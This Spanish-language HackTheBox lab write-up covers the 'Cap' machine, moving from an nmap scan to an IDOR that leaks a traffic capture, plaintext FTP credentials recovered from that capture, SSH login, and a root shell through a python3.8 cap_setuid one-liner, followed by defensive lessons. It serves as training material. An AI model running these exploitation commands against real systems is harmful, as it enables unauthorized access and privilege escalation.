# Cap — HackTheBox Writeup

| Campo         | Detalle                        |
|---------------|--------------------------------|
| **Máquina**   | Cap                            |
| **OS**        | Linux                          |
| **IP**        | 10.129.29.96                   |
| **Dificultad**| Fácil                          |
| **Fecha**     | Junio 2026                     |

---

## Índice

1. [Reconocimiento](#1-reconocimiento)
2. [Enumeración](#2-enumeración)
3. [Explotación — IDOR](#3-explotación--idor)
4. [Análisis del PCAP](#4-análisis-del-pcap)
5. [Acceso inicial](#5-acceso-inicial)
6. [Escalada de privilegios](#6-escalada-de-privilegios)
7. [Flags](#7-flags)
8. [Lecciones aprendidas](#8-lecciones-aprendidas)

---

## 1. Reconocimiento

Lo primero es identificar qué puertos están abiertos en la máquina. Se realiza un escaneo completo de puertos con `nmap`:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.29.96 -oG allPorts
```

**Puertos abiertos:**
- 21 — FTP
- 22 — SSH
- 80 — HTTP

Con los puertos identificados, se lanza un segundo escaneo para detectar versiones y ejecutar scripts básicos de enumeración:

```bash
nmap -p21,22,80 -sCV 10.129.29.96 -oN targeted
```

**Versiones detectadas:**
- `vsftpd 3.0.3`
- `OpenSSH 8.2p1 Ubuntu`
- `Werkzeug/2.0.0 Python/3.8.5` (servidor web)

Se comprueba si existen exploits conocidos para estas versiones:

```bash
searchsploit vsftpd 3.0.3
searchsploit OpenSSH 8.2
```

No se encuentra ningún exploit crítico aplicable. Se descarta esta vía y se pasa a enumerar la web.

---

## 2. Enumeración

Se analiza la web con `whatweb` y `wappalyzer`:

```bash
whatweb http://10.129.29.96
```

Se trata de una aplicación Flask con Bootstrap que permite subir y analizar archivos `.pcap`.

Explorando la web manualmente se descubre un endpoint interesante:

```
http://10.129.29.96/data/{id}
```

Donde `{id}` es un número que varía entre 1 y 3 según la sesión. Cada ID corresponde a una captura de tráfico de red descargable.

---

## 3. Explotación — IDOR

Se detecta una vulnerabilidad de tipo **IDOR (Insecure Direct Object Reference)**: el parámetro `id` no está validado ni vinculado a la sesión del usuario, por lo que es posible acceder a recursos de otros usuarios simplemente modificando el valor.

Se prueba con `id=0`:

```
http://10.129.29.96/data/0
```

La página existe y permite descargar un archivo `.pcap` correspondiente a una captura de tráfico que no debería ser accesible.

---

## 4. Análisis del PCAP

Se analiza el archivo descargado con `tshark`:

```bash
tshark -r 0.pcap -Y "ftp"
```

El archivo contiene tráfico FTP en texto claro. El protocolo FTP no cifra las comunicaciones, por lo que las credenciales son visibles directamente:

```
USER nathan
PASS Buck3tH4TF0RM3!
```

Se obtienen las credenciales del usuario `nathan`.

---

## 5. Acceso inicial

Se comprueba si las credenciales se reutilizan en el servicio SSH (práctica habitual):

```bash
ssh nathan@10.129.29.96
```

El acceso es exitoso. En el directorio home del usuario se encuentra la primera flag:

```bash
cat ~/user.txt
```

---

## 6. Escalada de privilegios

### Búsqueda de binarios SUID

```bash
find / -perm -4000 -user root 2>/dev/null | xargs ls -l
```

No se encuentra nada aprovechable.

### Búsqueda de capabilities

```bash
getcap -r / 2>/dev/null
```

Resultado:

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

`/usr/bin/python3.8` tiene asignada la capability `cap_setuid`, lo que permite cambiar el UID del proceso en ejecución. Esto es una vulnerabilidad crítica: cualquier usuario puede invocar Python y establecer su UID a 0 (root).

Se explota de la siguiente forma:

```bash
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Se obtiene una shell como `root`.

---

## 7. Flags

```bash
# Flag de usuario
cat /home/nathan/user.txt

# Flag de root
cat /root/root.txt
```

---

## 8. Lecciones aprendidas

- **IDOR**: nunca confiar en parámetros controlados por el usuario para acceder a recursos. Siempre vincular los recursos a la sesión autenticada.
- **FTP en texto claro**: el protocolo FTP transmite credenciales sin cifrar. En entornos reales debe sustituirse por SFTP o FTPS.
- **Reutilización de contraseñas**: las credenciales obtenidas por FTP funcionaron también en SSH, lo que permitió el acceso inicial.
- **Linux Capabilities**: las capabilities mal configuradas pueden ser tan peligrosas como un binario SUID. `cap_setuid` en Python permite escalar a root trivialmente.
